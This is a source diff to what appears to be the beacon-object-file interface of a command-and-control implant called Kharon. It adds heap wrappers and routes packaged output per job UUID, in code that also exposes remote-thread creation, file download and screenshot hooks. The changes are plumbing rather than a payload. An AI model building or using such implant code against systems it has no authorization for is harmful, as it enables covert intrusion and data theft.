@@ -393,45 +393,128 @@ auto DECLFN Coff::CreateThread(
     return Self->Td->Create( NtCurrentProcess(), (PVOID)Start, Parameter, StackSize, Flags, nullptr, Attributes);
 }
 
+auto DECLFN Coff::HeapAlloc(
+    _In_ ULONG size
+) -> PVOID {
+    G_KHARON
+
+    return Self->Hp->Alloc( size );
+}
+
+auto DECLFN Coff::HeapReAlloc(
+    _In_ PVOID block,
+    _In_ ULONG size
+) -> PVOID {
+    G_KHARON
+
+    return Self->Hp->ReAlloc( block, size );
+}
+
+auto DECLFN Coff::HeapFree(
+    _In_ PVOID block
+) -> BOOL {
+    G_KHARON
+
+    return Self->Hp->Free( block );
+}
+
+auto DECLFN Coff::HeapCheckPtr(
+    _In_ PVOID block
+) -> BOOL {
+    G_KHARON
+
+    return Self->Hp->CheckPtr( block );
+}
+
 auto DECLFN Coff::PkgInt8(
-    _In_ BYTE Data
+    _In_ BYTE  Data,
+    _In_ PCHAR UUID
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Byte( Self->Pkg->Shared, Data );
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Byte( Pkg, Data );
 };
 
 auto DECLFN Coff::PkgInt16(
-    _In_ INT16 Data
+    _In_ INT16 Data,
+    _In_ PCHAR UUID
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int16( Self->Pkg->Shared, Data );
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int16( Pkg, Data );
 };
 
 auto DECLFN Coff::PkgInt32(
-    INT32    Data
+    _In_ INT32 Data,
+    _In_ PCHAR UUID
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int32( Self->Pkg->Shared, Data );
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int32( Pkg, Data );
 }
 
 auto DECLFN Coff::PkgInt64(
-    INT32    Data
+    _In_ INT32 Data,
+    _In_ PCHAR UUID
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Int64( Self->Pkg->Shared, Data );
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Int64( Pkg, Data );
 }
 
 auto DECLFN Coff::PkgBytes(
-    PBYTE    Buffer,
-    ULONG    Length
+    _In_ PBYTE Buffer,
+    _In_ ULONG Length,
+    _In_ PCHAR UUID
 ) -> VOID {
     G_KHARON
 
-    return Self->Pkg->Bytes( Self->Pkg->Shared, Buffer, Length );
+    PACKAGE* Pkg = nullptr;
+
+    if ( ! UUID ) {
+        Pkg = Self->Pkg->Shared;
+    } else {
+        JOBS* Job = Self->Jbs->GetByUUID( UUID );
+        Pkg = Job->Pkg;
+    }
+
+    return Self->Pkg->Bytes( Pkg, Buffer, Length );
 }
 
 auto DECLFN Coff::CreateRemoteThread(
@@ -733,13 +816,13 @@ auto DECLFN Coff::AxDownloadMemory(
     VOID* MemRange  = __builtin_return_address( 0 );
     ULONG CommandID = Self->Cf->GetCmdID( MemRange );
 
-    PACKAGE* TmpPkg = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
+    PACKAGE* TmpPkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
     if ( ! TmpPkg ) {
         KhDbg( "AxDownloadMemory: package allocation failed" );
         return;
     }
 
-    TmpPkg->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
     TmpPkg->Length = 0;
 
     Self->Pkg->Str( TmpPkg, filename );
@@ -768,12 +851,12 @@ auto DECLFN Coff::AxAddScreenshot(
     VOID* MemRange  = __builtin_return_address( 0 );
     ULONG CommandID = Self->Cf->GetCmdID( MemRange );
 
-    PACKAGE* TmpPkg = (PACKAGE*)hAlloc( sizeof( PACKAGE ) );
+    PACKAGE* TmpPkg = (PACKAGE*)KhAlloc( sizeof( PACKAGE ) );
     if ( ! TmpPkg ) {
         return;
     }
 
-    TmpPkg->Buffer = PTR( hAlloc( sizeof( BYTE ) ) );
+    TmpPkg->Buffer = PTR( KhAlloc( sizeof( BYTE ) ) );
     TmpPkg->Length = 0;
 
     Self->Pkg->Str( TmpPkg, note );
